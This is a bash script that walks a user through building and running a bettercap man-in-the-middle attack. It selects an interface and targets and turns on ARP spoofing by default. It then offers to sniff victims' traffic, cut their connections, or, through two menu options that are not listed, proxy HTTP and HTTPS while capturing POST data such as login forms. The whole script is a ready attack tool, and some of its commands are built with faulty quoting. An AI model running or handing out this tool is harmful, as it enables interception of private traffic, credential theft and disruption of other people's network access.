#explain goal, generate command -> mitm attack
echo "Generating command for MitM attack"
COMMAND="sudo bettercap"
#show interfaces
netstat -i
#ask interface
echo ""
echo "Type the interface you want to use,followed by [ENTER]:"
read interface
COMMAND=$COMMAND" -I "$interface
#ask if no-spoofing
echo ""
echo "Specify targets? [y/N]"
read target_yn
if [ "$target_yn" = "y" ]; 
then
	echo ""
	echo "Scan targets? [Y/n]"
	read scan_yn
	if [ "$scan_yn" != "n" ]; 
	then
		sh ~/scan_networks.sh  
	fi
	echo ""
	echo "Specify targets (comma seperated or range -), followed by [ENTER]:"
	read targets
	COMMAND=$COMMAND" -T "$targets
fi
echo ""
echo "Do you want to reroute traffic on the network(spoofing), [Y/n]"
read spoof_yn
if [ "$spoof_yn" = "n" ]; 
then
	COMMAND=$COMMAND" --no-spoofing"
fi

echo""
echo "THIS IS THE BASE COMMAND:"
echo $COMMAND
echo ""
echo "Select an option:"
echo "(0) run this command"
echo "(1) see the traffic"
echo "(2) kill the traffic"
echo "(c) custom command"
read option
echo "just a moment ..."
echo ""
if [ "$option" = "0" ]; then
	$COMMAND
fi
if [ "$option" = "1" ]; then
	$COMMAND" -X"
fi
if [ "$option" = "2" ]; then
	$COMMAND" --kill"
fi
if [ "$option" = "3" ]; then
	$COMMAND" --proxy -P POST"
fi
if [ "$option" = "4" ]; then
	$COMMAND" --proxy --proxy-https -P POST"
fi
if [ "$option" = "c" ]; then
	echo "type your custom command:"
	read custom
	echo ""
	$COMMAND" "$custom
fi
